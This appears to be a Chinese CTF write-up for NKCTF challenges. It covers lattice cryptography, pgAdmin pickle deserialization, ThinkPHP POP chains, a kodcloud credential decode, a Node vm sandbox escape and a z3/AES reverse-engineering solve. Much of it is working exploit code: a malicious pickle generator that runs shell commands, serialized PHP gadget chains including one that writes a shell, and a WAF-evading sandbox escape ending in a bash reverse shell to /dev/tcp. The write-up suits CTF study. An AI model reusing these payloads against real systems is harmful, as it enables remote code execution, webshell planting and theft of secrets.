def unimodular_matrix(n):    S = identity_matrix(n)    X = identity_matrix(n)    for i in range(n):        for j in range(i,n):            S[j, i] = choice([-1,1])            X[i, j] = choice([-1,1])    assert  det(S*X) == 1 or det(S*X) == -1    return S*X
def get_error(n,delta):    k = 4*delta -2    tmp = []    tmp += [delta - 2]*(n//k)    tmp += [delta - 1]*( ((k-2)*n) // (2*k))    tmp += [delta]*(n//k)    tmp += [delta + 1]*( ((k-2)*n) // (2*k))    return tmp
assert len(flag) == 44assert delta < 20
V,W = get_key(n) gift = str(hex(randint(70, 80))).zfill(5).encode('utf-8')flag =  gift + flagprint(flag)m = [i for i in flag]pad = [randint(-128, 127) for i in range(n-len(m)) ]m = vector(ZZ, m + pad)r = vector(get_error(n,delta))c = m * W + rassert floor((r).norm()) == delta*(floor(sqrt(n)))
with open('pubkey.txt', 'w') as f:    f.write(str(W))
with open('ciphertext.txt', 'w') as f:    f.write(str(c))

严格意义上并不属于GGH的攻击，扰动向量r只和n,delta的值有关，而n显然是矩阵的大小260，题中又说delta<20，那么爆破所有可能的delta值（爆破得到的可能值是1，3，7；本题是7）就可以得到扰动向量r的值。

c减去r后直接除公钥W就是m

exp:

# sage
n = 260delta = 7
def read_as_matrix(filename): m = [] with open(filename,'r') as file: data = file.readlines() for i in data[:-1]: data2 = list(map(int,(i[1:-2].split()))) m.append(data2) m.append(list(map(int,(data[-1][1:-1].split())))) return Matrix(m)
def get_error(n,delta): k = 4*delta -2 tmp = [] tmp += [delta - 2]*(n//k) tmp += [delta - 1]*( ((k-2)*n) // (2*k)) tmp += [delta]*(n//k) tmp += [delta + 1]*( ((k-2)*n) // (2*k)) return tmp
W = read_as_matrix("pubkey.txt")with open('ciphertext.txt', 'r') as f: c = f.readline()c = eval(c)c = vector(c)r = vector(get_error(n,delta))mw = c - rflag = mw/Wprint(bytes(flag[:49]))# b'00x4dnkctf{G0od_Y0u_Ar3_Kn0W_Ggh_Crypt0syst3m!!!}'

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:222328705

星盟安全团队纳新群2:346014666

有兴趣的师傅欢迎一起来讨论!

PS:团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@wuyua师傅


```
import struct  
def produce_pickle_bytes(platform, cmd):      b = b'x80x04x95'      b += struct.pack('L', 22 + len(platform) + len(cmd))+b'x00x00x00x00'      b += b'x8c' + struct.pack('b', len(platform)) + platform.encode()      b += b'x94x8cx06systemx94x93x94'      b += b'x8c' + struct.pack('b', len(cmd)) + cmd.encode()      b += b'x94x85x94Rx94.'      print(b)      return b  
if __name__ == '__main__':      with open('posix.pickle', 'wb') as f:          f.write(produce_pickle_bytes('posix', f"echo $(cat /proc/1/environ;cat/proc/1/cmdline)>/var/lib/pgadmin/storage/tacooooo_qq.com/22"))
```



```
POST /file_manager/filemanager/8701307/ HTTP/1.1  Host: 2f51b1e4-63fa-44bd-9a31-e4fb32f62bb9.node.nkctf.yuzhian.com.cn  Referer: http://2f51b1e4-63fa-44bd-9a31-e4fb32f62bb9.node.nkctf.yuzhian.com.cn/browser/  Accept-Encoding: gzip, deflate  X-pgA-CSRFToken: IjE3OTZjN2JlNjg0NWNlZWZhNWRlNjNjNDM4MTRlODg5ZGQwNjMxZWUi.Zf6KXg.urVXb5fSr9iBmeGBOXWRA7JwrMI  Content-Type: application/json  Cookie: pga4_session=/var/lib/pgadmin/storage/tacooooo_qq.com/posix.pickle!a; PGADMIN_LANGUAGE=en  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0  Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6  Accept: application/json, text/plain, */*  Origin: http://2f51b1e4-63fa-44bd-9a31-e4fb32f62bb9.node.nkctf.yuzhian.com.cn  Content-Length: 97  
{"path":"/","mode":"getfolder","file_type":"*","show_hidden":false,"storage_folder":"my_storage"}
```



```
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=07e5b28e4e6cFLAG=NKCTF{358327e7-1998-40ce-9a8f-52e9ff44479b}PYTHONPATH=/pgadmin4PGADMIN_DEFAULT_EMAIL=tacooooo@qq.comPGADMIN_DEFAULT_PASSWORD=tacoooooHOME=/root
```



```
Windwos#__destruct##removeFiles()Collection#__toString##toJson()###toArray()
```



```
<?php
namespace think;
class Config{}
namespace think;abstract class Testone{}
namespace think;
use thinkexceptionClassNotFoundException;use thinkresponseRedirect;class Debug extends Testone{    protected $data = [];    public $engine;    public function __construct(){        $this->data["Loginout"] = new Config();        $this->engine = array("time"=>"10086");    }}
namespace think;
class View{    protected $data = [];    public $engine;    public function __construct(){        $this->data["Loginout"] = new Debug();        $this->engine = array("time"=>"10086");    }}

namespace think;
use ArrayAccess;use ArrayIterator;use Countable;use IteratorAggregate;use JsonSerializable;use Traversable;class Collection implements ArrayAccess, Countable, IteratorAggregate, JsonSerializable{    protected $items = [];
    /**     * Collection constructor.     * @access public     * @param  array $items 数据     */    public function __construct($items = [])    {        $this->items = new View();    }
    public function getIterator(){        // TODO: Implement getIterator() method.    }
    public function offsetExists($offset){        // TODO: Implement offsetExists() method.    }
    public function offsetGet($offset){        // TODO: Implement offsetGet() method.    }
    public function offsetSet($offset, $value){        // TODO: Implement offsetSet() method.    }
    public function offsetUnset($offset){        // TODO: Implement offsetUnset() method.    }
    public function count(){        // TODO: Implement count() method.    }
    public function jsonSerialize(){        // TODO: Implement jsonSerialize() method.    }}

namespace thinkprocesspipes;
use thinkCollection;use thinkProcess;
class Windows extends Pipes{    public $filename;    public $files;    public function __construct(){        $this->filename = new Collection();        $this->files = array(new Collection());    }}
abstract class Pipes{}

$windows = new Windows();$serialize = serialize($windows);echo base64_encode($serialize);
```



```
亲爱的Chu0，
我怀着一颗激动而充满温柔的心，写下这封情书，希望它能够传达我对你的深深情感。或许这只是一封文字，但我希望每一个字都能如我心情般真挚。
在这个瞬息万变的世界里，你是我生命中最美丽的恒定。每一天，我都被你那灿烂的笑容和温暖的眼神所吸引，仿佛整个世界都因为有了你而变得更加美好。你的存在如同清晨第一缕阳光，温暖而宁静。
或许，我们之间存在一种特殊的联系，一种只有我们两个能够理解的默契。

<<<<<<<<我曾听说，密码的明文，加上心爱之人的名字(Chu0)，就能够听到游客的心声。>>>>>>>>

而我想告诉你，你就是我心中的那个游客。每一个与你相处的瞬间，都如同解开心灵密码的过程，让我更加深刻地感受到你的独特魅力。
你的每一个微笑，都是我心中最美丽的音符；你的每一句关心，都是我灵魂深处最温暖的拥抱。在这个喧嚣的世界中，你是我安静的港湾，是我倚靠的依托。我珍视着与你分享的每一个瞬间，每一段回忆都如同一颗珍珠，串联成我生命中最美丽的项链。
或许，这封情书只是文字的表达，但我愿意将它寄予你，如同我内心深处对你的深深情感。希望你能感受到我的真挚，就如同我每一刻都在努力解读心灵密码一般。愿我们的故事能够继续，在这段感情的旅程中，我们共同书写属于我们的美好篇章。

POST /?user/index/loginSubmit HTTP/1.1Host: 192.168.128.2Content-Length: 162Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://192.168.128.2Referer: http://192.168.128.2/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=xxxConnection: close
name=guest&password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI&rememberPassword=0&salt=1&CSRF_TOKEN=xxx&API_ROUTE=user%2Findex%2FloginSubmit
hint: 新建文件
```



```
<?php
/** @link http://kodcloud.com/* @author warlee | e-mail:kodcloud@qq.com* @copyright warlee 2014.(Shanghai)Co.,Ltd* @license http://kodcloud.com/tools/license/license.txt*------* 字符串加解密类；* 一次一密；且定时解密有效* 可用于加密&动态key生成* demo：* 加密：echo Mcrypt::encode('abc','123');* 解密：echo Mcrypt::decode('9f843I0crjv5y0dWE_-uwzL_mZRyRb1ynjGK4I_IACQ','123');*/
class Mcrypt{  public static $defaultKey = 'a!takA:dlmcldEv,e';
  /**   * 字符加解密，一次一密,可定时解密有效   *   * @param string $string 原文或者密文   * @param string $operation 操作(encode | decode)   * @param string $key 密钥   * @param int $expiry 密文有效期,单位s,0 为永久有效   * @return string 处理后的 原文或者 经过 base64_encode 处理后的密文   */  public static function encode($string,$key = '', $expiry = 0,$cKeySet='',$encode=true){    if($encode){$string = rawurlencode($string);}    $ckeyLength = 4;      $key = md5($key ? $key : self::$defaultKey); //解密密匙    $keya = md5(substr($key, 0, 16));     //做数据完整性验证      $keyb = md5(substr($key, 16, 16));     //用于变化生成的密文 (初始化向量IV)      $cKeySet = $cKeySet ? $cKeySet: md5(microtime());    $keyc = substr($cKeySet, - $ckeyLength);    $cryptkey = $keya . md5($keya . $keyc);      $keyLength = strlen($cryptkey);    $string = sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string . $keyb), 0, 16) . $string;    $stringLength = strlen($string);
    $rndkey = array();    for($i = 0; $i <= 255; $i++) {      $rndkey[$i] = ord($cryptkey[$i % $keyLength]);    }
    $box = range(0, 255);    // 打乱密匙簿，增加随机性    for($j = $i = 0; $i < 256; $i++) {      $j = ($j + $box[$i] + $rndkey[$i]) % 256;      $tmp = $box[$i];      $box[$i] = $box[$j];      $box[$j] = $tmp;    }    // 加解密，从密匙簿得出密匙进行异或，再转成字符    $result = '';    for($a = $j = $i = 0; $i < $stringLength; $i++) {      $a = ($a + 1) % 256;      $j = ($j + $box[$a]) % 256;      $tmp = $box[$a];      $box[$a] = $box[$j];      $box[$j] = $tmp;      $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));    }    $result = $keyc . str_replace('=', '', base64_encode($result));    $result = str_replace(array('+', '/', '='),array('-', '_', '.'), $result);    return $result;  }
  /**   * 字符加解密，一次一密,可定时解密有效   *   * @param string $string 原文或者密文   * @param string $operation 操作(encode | decode)   * @param string $key 密钥   * @param int $expiry 密文有效期,单位s,0 为永久有效   * @return string 处理后的 原文或者 经过 base64_encode 处理后的密文   */  public static function decode($string,$key = '',$encode=true){    $string = str_replace(array('-', '_', '.'),array('+', '/', '='), $string);    $ckeyLength = 4;    $key = md5($key ? $key : self::$defaultKey); //解密密匙    $keya = md5(substr($key, 0, 16));     //做数据完整性验证      $keyb = md5(substr($key, 16, 16));     //用于变化生成的密文 (初始化向量IV)    $keyc = substr($string, 0, $ckeyLength);    $cryptkey = $keya . md5($keya . $keyc);      $keyLength = strlen($cryptkey);    $string = base64_decode(substr($string, $ckeyLength));    $stringLength = strlen($string);
    $rndkey = array();    for($i = 0; $i <= 255; $i++) {      $rndkey[$i] = ord($cryptkey[$i % $keyLength]);    }
    $box = range(0, 255);    // 打乱密匙簿，增加随机性    for($j = $i = 0; $i < 256; $i++) {      $j = ($j + $box[$i] + $rndkey[$i]) % 256;      $tmp = $box[$i];      $box[$i] = $box[$j];      $box[$j] = $tmp;    }    // 加解密，从密匙簿得出密匙进行异或，再转成字符    $result = '';    for($a = $j = $i = 0; $i < $stringLength; $i++) {      $a = ($a + 1) % 256;      $j = ($j + $box[$a]) % 256;      $tmp = $box[$a];      $box[$a] = $box[$j];      $box[$j] = $tmp;      $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));    }    $theTime = intval(substr($result, 0, 10));    $resultStr  = '';    if (($theTime == 0 || $theTime - time() > 0)    && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)    ) {      $resultStr = substr($result, 26);      if($encode){$resultStr = rawurldecode($resultStr);}    }    return $resultStr;  }}$key = substr("tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI", 0, 5) . "2&$%@(*@(djfhj1923";$strings = Mcrypt::decode(substr("tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI", 5), $key);echo $strings;// echo Mcrypt::decode('tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI',"2&$%@(*@(djfhj1923");
```



```
<?php
namespace think;
class Config{}
namespace think;
class View{    protected $data = [];    public $engine;    public function __construct(){        $this->data["Loginout"] = new Config();        $this->engine = array("name"=>"data/files/shell");    }}

namespace think;
use ArrayAccess;use ArrayIterator;use Countable;use IteratorAggregate;use JsonSerializable;use Traversable;class Collection implements ArrayAccess, Countable, IteratorAggregate, JsonSerializable{    protected $items = [];
    /**     * Collection constructor.     * @access public     * @param  array $items 数据     */    public function __construct($items = [])    {        $this->items = new View();    }
    public function getIterator(){        // TODO: Implement getIterator() method.    }
    public function offsetExists($offset){        // TODO: Implement offsetExists() method.    }
    public function offsetGet($offset){        // TODO: Implement offsetGet() method.    }
    public function offsetSet($offset, $value){        // TODO: Implement offsetSet() method.    }
    public function offsetUnset($offset){        // TODO: Implement offsetUnset() method.    }
    public function count(){        // TODO: Implement count() method.    }
    public function jsonSerialize(){        // TODO: Implement jsonSerialize() method.    }}

namespace thinkprocesspipes;
use thinkCollection;use thinkProcess;
class Windows extends Pipes{    public $filename;    public $files;    public function __construct(){        $this->filename = new Collection();        $this->files = array(new Collection());    }}
abstract class Pipes{}

$windows = new Windows();$serialize = serialize($windows);echo base64_encode($serialize);
```



```
const express = require('express');const bodyParser = require('body-parser');const app = express();const fs = require("fs");const path = require('path');const vm = require("vm");
app.use(bodyParser.json()).set('views', path.join(__dirname, 'views')).use(express.static(path.join(__dirname, '/public')))
app.get('/', function (req, res){    res.sendFile(__dirname + '/public/home.html');})

function waf(code) {    let pattern = /(process|[.*?]|exec|spawn|Buffer|\|+|concat|eval|Function)/g;    if(code.match(pattern)){        throw new Error("what can I say? hacker out!!");    }}
app.post('/', function (req, res){        let code = req.body.code;        let sandbox = Object.create(null);        let context = vm.createContext(sandbox);        try {            waf(code)            let result = vm.runInContext(code, context);            console.log(result);        } catch (e){            console.log(e.message);            require('./hack');        }})
app.get('/secret', function (req, res){    if(process.__filename == null) {        let content = fs.readFileSync(__filename, "utf-8");        return res.send(content);    } else {        let content = fs.readFileSync(process.__filename, "utf-8");        return res.send(content);    }})

app.listen(3000, ()=>{    console.log("listen on 3000");})
```



```
const vm = require("vm");app.post('/', function (req, res){        let code = req.body.code;        let sandbox = Object.create(null);        let context = vm.createContext(sandbox);        try {            waf(code)            let result = vm.runInContext(code, context);
```



```
throw new Proxy({}, {        get: function(){            const cc = arguments.callee.caller;            const p = (cc.constructor.constructor('return process'))();            return p.mainModule.require('child_process').execSync('whoami').toString();        }    })
```



```
mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115))
```



```
const b = Reflect.get(p, Reflect.ownKeys(p).find(x=>x.includes('pro'))).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));
```



```
throw new Proxy({}, {        get: function(){            const cc = arguments.callee.caller;            const p = (cc.constructor.constructor('return global'))();            const b = Reflect.get(p, Reflect.ownKeys(p).find(x=>x.includes('pro'))).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));            return Reflect.get(b, Reflect.ownKeys(b).find(x=>x.includes('ex')))("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'");        }    })
```



```
from z3 import *import binasciiimport reimport hashlibx = Solver()ans=[]a1 = [Int('%d'%i) for i in range(16)]x.add(a1[2] + a1[1] + a1[0] + a1[3] == 447      , 101 * a1[2] + a1[0] + 9 * a1[1] + 8 * a1[3] == 12265      , 5 * a1[2] + 3 * a1[0] + 4 * a1[1] + 6 * a1[3] == 2000      , 88 * a1[2] + 12 * a1[0] + 11 * a1[1] + 87 * a1[3] == 21475      , a1[6] + 59 * a1[5] + 100 * a1[4] + a1[7] == 7896      , 443 * a1[4] + 200 * a1[5] + 10 * a1[6] + 16 * a1[7] == 33774      , 556 * a1[5] + 333 * a1[4] + 8 * a1[6] + 7 * a1[7] == 44758      , a1[6] + a1[5] + 202 * a1[4] + a1[7] == 9950      , 78 * a1[10] + 35 * a1[9] + 23 * a1[8] + 89 * a1[11] == 24052      , 78 * a1[8] + 59 * a1[9] + 15 * a1[10] + 91 * a1[11] == 25209      , 111 * a1[10] + 654 * a1[9] + 123 * a1[8] + 222 * a1[11] == 113427      , 6 * a1[9] + 72 * a1[8] + 5 * a1[10] + 444 * a1[11] == 54166      , 56 * a1[14] + 35 * a1[12] + 6 * a1[13] + 121 * a1[15] == 11130      , 169 * a1[14] + 158 * a1[13] + 98 * a1[12] + 124 * a1[15] == 27382      , 147 * a1[13] + 65 * a1[12] + 131 * a1[14] + 129 * a1[15] == 23564      , 137 * a1[14] + 132 * a1[13] + 620 * a1[12] + 135 * a1[15] == 51206)if x.check() == sat:    model = x.model()    for i in range(16):        ans.append(model[a1[i]].as_long().real)username="".join(map(chr,ans))print(username)
enc1=[0x7E, 0x5A, 0x6E, 0x77, 0x3A, 0x79, 0x35, 0x76, 0x7C]pre_pass=""for i in range(len(enc1)):    pre_pass+=chr((enc1[i]-9+i)^i)print(pre_pass)

class AES:#128-ECB    sbox = [0x31, 0x52, 0x5A, 0xC8, 0x0B, 0xAC, 0xF3, 0x3A, 0x8B, 0x54,  0x27, 0x9B, 0xAB, 0x95, 0xDE, 0x83, 0x60, 0xCB, 0x53, 0x7F,  0xC4, 0xE3, 0x0A, 0x97, 0xE0, 0x29, 0xD5, 0x68, 0xC5, 0xDF,  0xF4, 0x7B, 0xAA, 0xD6, 0x42, 0x78, 0x6C, 0xE9, 0x70, 0x17,  0xD7, 0x37, 0x24, 0x49, 0x75, 0xA9, 0x89, 0x67, 0x03, 0xFA,  0xD9, 0x91, 0xB4, 0x5B, 0xC2, 0x4E, 0x92, 0xFC, 0x46, 0xB1,  0x73, 0x08, 0xC7, 0x74, 0x09, 0xAF, 0xEC, 0xF5, 0x4D, 0x2D,  0xEA, 0xA5, 0xDA, 0xEF, 0xA6, 0x2B, 0x7E, 0x0C, 0x8F, 0xB0,  0x04, 0x06, 0x62, 0x84, 0x15, 0x8E, 0x12, 0x1D, 0x44, 0xC0,  0xE2, 0x38, 0xD4, 0x47, 0x28, 0x45, 0x6E, 0x9D, 0x63, 0xCF,  0xE6, 0x8C, 0x18, 0x82, 0x1B, 0x2C, 0xEE, 0x87, 0x94, 0x10,  0xC1, 0x20, 0x07, 0x4A, 0xA4, 0xEB, 0x77, 0xBC, 0xD3, 0xE1,  0x66, 0x2A, 0x6B, 0xE7, 0x79, 0xCC, 0x86, 0x16, 0xD0, 0xD1,  0x19, 0x55, 0x3C, 0x9F, 0xFB, 0x30, 0x98, 0xBD, 0xB8, 0xF1,  0x9E, 0x61, 0xCD, 0x90, 0xCE, 0x7C, 0x8D, 0x57, 0xAE, 0x6A,  0xB3, 0x3D, 0x76, 0xA7, 0x71, 0x88, 0xA2, 0xBA, 0x4F, 0x3E,  0x40, 0x64, 0x0F, 0x48, 0x21, 0x35, 0x36, 0x2F, 0xE8, 0x14,  0x5D, 0x51, 0xD8, 0xB5, 0xFE, 0xD2, 0x96, 0x93, 0xA1, 0xB6,  0x43, 0x0D, 0x4C, 0x80, 0xC9, 0xFF, 0xA3, 0xDD, 0x72, 0x05,  0x59, 0xBF, 0x0E, 0x26, 0x34, 0x1F, 0x13, 0xE5, 0xDC, 0xF2,  0xC6, 0x50, 0x1E, 0xE4, 0x85, 0xB7, 0x39, 0x8A, 0xCA, 0xED,  0x9C, 0xBB, 0x56, 0x23, 0x1A, 0xF0, 0x32, 0x58, 0xB2, 0x65,  0x33, 0x6F, 0x41, 0xBE, 0x3F, 0x6D, 0x11, 0x00, 0xAD, 0x5F,  0xC3, 0x81, 0x25, 0xA8, 0xA0, 0x9A, 0xF6, 0xF7, 0x5E, 0x99,  0x22, 0x2E, 0x4B, 0xF9, 0x3B, 0x02, 0x7A, 0xB9, 0x5C, 0x69,  0xF8, 0x1C, 0xDB, 0x01, 0x7D, 0xFD]    s_box = {}    ns_box = {   }
    Rcon = {        1: ['0x01', '0x00', '0x00', '0x00'],        2: ['0x02', '0x00', '0x00', '0x00'],        3: ['0x04', '0x00', '0x00', '0x00'],        4: ['0x08', '0x00', '0x00', '0x00'],        5: ['0x10', '0x00', '0x00', '0x00'],        6: ['0x20', '0x00', '0x00', '0x00'],        7: ['0x40', '0x00', '0x00', '0x00'],        8: ['0x80', '0x00', '0x00', '0x00'],        9: ['0x1B', '0x00', '0x00', '0x00'],        10: ['0x36', '0x00', '0x00', '0x00']    }    Matrix = [        ['0x02', '0x03', '0x01', '0x01'],        ['0x01', '0x02', '0x03', '0x01'],        ['0x01', '0x01', '0x02', '0x03'],        ['0x03', '0x01', '0x01', '0x02']    ]    ReMatrix = [        ['0x0e', '0x0b', '0x0d', '0x09'],        ['0x09', '0x0e', '0x0b', '0x0d'],        ['0x0d', '0x09', '0x0e', '0x0b'],        ['0x0b', '0x0d', '0x09', '0x0e']    ]    plaintext = [[], [], [], []]    plaintext1 = [[], [], [], []]    subkey = [[], [], [], []]
    def __init__(self, key):#密钥扩展        self.s_box = dict(zip(["0x%02x"%i for i in range(256)], ["0x%02x"%i for i in self.sbox]))        self.ns_box = dict(zip(self.s_box.values(), self.s_box.keys()))        for i in range(4):            for j in range(0, 8, 2):                self.subkey[i].append("0x" + key[i * 8 + j:i * 8 + j + 2])        # print(self.subkey)        for i in range(4, 44):            if i % 4 != 0:                tmp = xor_32(self.subkey[i - 1], self.subkey[i - 4],0)                self.subkey.append(tmp)            else:  # 4的倍数的时候执行                tmp1 = self.subkey[i - 1][1:]                tmp1.append(self.subkey[i - 1][0])                # print(tmp1)                for m in range(4):                    tmp1[m] = self.s_box[tmp1[m]]                # tmp1 = self.s_box['cf']                tmp1 = xor_32(tmp1, self.Rcon[i / 4], 0)                self.subkey.append(xor_32(tmp1, self.subkey[i - 4],0))
    def AddRoundKey(self, round):#轮密钥加        for i in range(4):            self.plaintext[i] = xor_32(self.plaintext[i], self.subkey[round * 4 + i],0)        # print('AddRoundKey',self.plaintext)
    def PlainSubBytes(self):        for i in range(4):            for j in range(4):                self.plaintext[i][j] = self.s_box[self.plaintext[i][j]]        # print('PlainSubBytes',self.plaintext)
    def RePlainSubBytes(self):        for i in range(4):            for j in range(4):                self.plaintext[i][j] = self.ns_box[self.plaintext[i][j]]
    def ShiftRows(self):#行移位        p1, p2, p3, p4 = self.plaintext[0][1], self.plaintext[1][1], self.plaintext[2][1], self.plaintext[3][1]        self.plaintext[0][1] = p2        self.plaintext[1][1] = p3        self.plaintext[2][1] = p4        self.plaintext[3][1] = p1        p1, p2, p3, p4 = self.plaintext[0][2], self.plaintext[1][2], self.plaintext[2][2], self.plaintext[3][2]        self.plaintext[0][2] = p3        self.plaintext[1][2] = p4        self.plaintext[2][2] = p1        self.plaintext[3][2] = p2        p1, p2, p3, p4 = self.plaintext[0][3], self.plaintext[1][3], self.plaintext[2][3], self.plaintext[3][3]        self.plaintext[0][3] = p4        self.plaintext[1][3] = p1        self.plaintext[2][3] = p2        self.plaintext[3][3] = p3        # print('ShiftRows',self.plaintext)
    def ReShiftRows(self):        p1, p2, p3, p4 = self.plaintext[0][1], self.plaintext[1][1], self.plaintext[2][1], self.plaintext[3][1]        self.plaintext[3][1] = p3        self.plaintext[2][1] = p2        self.plaintext[0][1] = p4        self.plaintext[1][1] = p1        p1, p2, p3, p4 = self.plaintext[0][2], self.plaintext[1][2], self.plaintext[2][2], self.plaintext[3][2]        self.plaintext[0][2] = p3        self.plaintext[1][2] = p4        self.plaintext[2][2] = p1        self.plaintext[3][2] = p2        p1, p2, p3, p4 = self.plaintext[0][3], self.plaintext[1][3], self.plaintext[2][3], self.plaintext[3][3]        self.plaintext[0][3] = p2        self.plaintext[1][3] = p3        self.plaintext[2][3] = p4        self.plaintext[3][3] = p1
    def MixColumns(self):#列混淆        for i in range(4):            for j in range(4):                self.plaintext1[i].append(MatrixMulti(self.Matrix[j], self.plaintext[i]))        # print('MixColumns',self.plaintext1)
    def ReMixColumns(self):        for i in range(4):            for j in range(4):                self.plaintext1[i].append(MatrixMulti(self.ReMatrix[j], self.plaintext[i]))
    def AESEncryption(self, plaintext):        self.plaintext = [[], [], [], []]        for i in range(4):            for j in range(0, 8, 2):                self.plaintext[i].append("0x" + plaintext[i * 8 + j:i * 8 + j + 2])        self.AddRoundKey(0)        for i in range(9):            self.PlainSubBytes()            self.ShiftRows()            self.MixColumns()            self.plaintext = self.plaintext1            self.plaintext1 = [[], [], [], []]            self.AddRoundKey(i + 1)
        self.PlainSubBytes()        self.ShiftRows()        self.AddRoundKey(10)        return Matrixtostr(self.plaintext)
    def AESDecryption(self, cipher):        self.plaintext = [[], [], [], []]        for i in range(4):            for j in range(0, 8, 2):                self.plaintext[i].append('0x' + cipher[i * 8 + j:i * 8 + j + 2])
        # print(self.ns_box)        self.AddRoundKey(10)        for i in range(9):            self.ReShiftRows()            self.RePlainSubBytes()            self.AddRoundKey(9-i)            self.ReMixColumns()            self.plaintext = self.plaintext1            self.plaintext1 = [[], [], [], []]        self.ReShiftRows()        self.RePlainSubBytes()        self.AddRoundKey(0)        return Matrixtostr(self.plaintext)
    def Encryption(self, text):        group = PlaintextGroup(TextToByte(text), 32, 1)        # print(group)        cipher = ""        for i in range(len(group)):            cipher = cipher + self.AESEncryption(group[i])        return cipher
    def Decryption(self, cipher):        group = PlaintextGroup(cipher, 32, 0)        # print(group)        text = ''        for i in range(len(group)):            text = text + self.AESDecryption(group[i])        text = ByteToText(text)        return text

def xor_32(start, end, key):    a = []    for i in range(0, 4):        xor_tmp = ""        b = hextobin(start[i])        c = hextobin(end[i])        d = bin(key)[2:].rjust(8,'0')        for j in range(8):            tmp = int(b[j], 10) ^ int(c[j], 10) ^ int(d[j],10)            xor_tmp += str(tmp )        a.append(bintohex(xor_tmp))    return a

def xor_8(begin, end):    xor_8_tmp = ""    for i in range(8):        xor_8_tmp += str(int(begin[i]) ^ int(end[i]))    return xor_8_tmp

def hextobin(word):    word = bin(int(word, 16))[2:]    for i in range(0, 8-len(word)):        word = '0'+word    return word
def bintohex(word):    word = hex(int(word, 2))    if len(word) == 4:        return word    elif len(word) < 4:        return word.replace('x', 'x0')

def MatrixMulti(s1, s2):    result = []    s3 = []    for i in range(4):        s3.append(hextobin(s2[i]))    for i in range(4):        result.append(MultiProcess(int(s1[i], 16), s3[i]))    for i in range(3):        result[0] = xor_8(result[0], result[i+1])    return bintohex(result[0])

def MultiProcess(a, b):    if a == 1:        return b    elif a == 2:        if b[0] == '0':            b = b[1:] + '0'        else:            b = b[1:] + '0'            b = xor_8(b, '00011011')        return b    elif a == 3:        tmp_b = b        if b[0] == '0':            b = b[1:] + '0'        else:            b = b[1:] + '0'            b = xor_8(b, '00011011')        return xor_8(b, tmp_b)
    elif a == 9:        tmp_b = b        return xor_8(tmp_b, MultiProcess(2, MultiProcess(2, MultiProcess(2, b))))    elif a == 11:        tmp_b = b        return xor_8(tmp_b, xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, b)))    elif a == 13:        tmp_b = b        return xor_8(tmp_b, xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, MultiProcess(2, b))))    elif a == 14:        return xor_8(MultiProcess(2, b), xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, MultiProcess(2, b))))

def Matrixtostr(matrix):    result = ""    for i in range(4):        for j in range(4):            result += matrix[i][j][2:]    return result

def PlaintextGroup(plaintext, length, flag):    group = re.findall('.{'+str(length)+'}', plaintext)    group.append(plaintext[len(group)*length:])    if group[-1] == '' and flag:        group[-1] = '16161616161616161616161616161616'    elif len(group[-1]) < length and flag:        tmp = int((length-len(group[-1])) / 2)        if tmp < 10:            for i in range(tmp):                group[-1] = group[-1] + '0'+str(tmp)        else:            for i in range(tmp):                group[-1] = group[-1] + str(tmp)    elif not flag:        del group[-1]    return group
#字符串转16进制def TextToByte(words):    text = words.encode('utf-8').hex()    return text

def ByteToText(encode):    tmp = int(encode[-2:])    word = ''    for i in range(len(encode)-tmp*2):        word = word + encode[i]    # print(word)    word = bytes.decode(binascii.a2b_hex(word))    return word#字节非轮异或def xorbytes(bytes1,bytes2):    length=min(len(bytes1),len(bytes2))    output=bytearray()    for i in range(length):        output.append(bytes1[i]^bytes2[i])    return bytes(output)
res='B0CC93EAE92FEF5699396E023B4F9E42'.lower()key = ''for i in username:    key+=hex(ord(i))[2:].rjust(2,"0")A1 = AES(key)tail_pass=""for i in range(0,len(res),32):    tail_pass+=bytes.fromhex(A1.AESDecryption(res[i:i+32])).decode()print(tail_pass)print(hashlib.md5(str(username+pre_pass+"_"+tail_pass).encode("utf-8")).hexdigest())#NKCTF{2961bba0add6265ba83bc6198e0ec758}
```



```
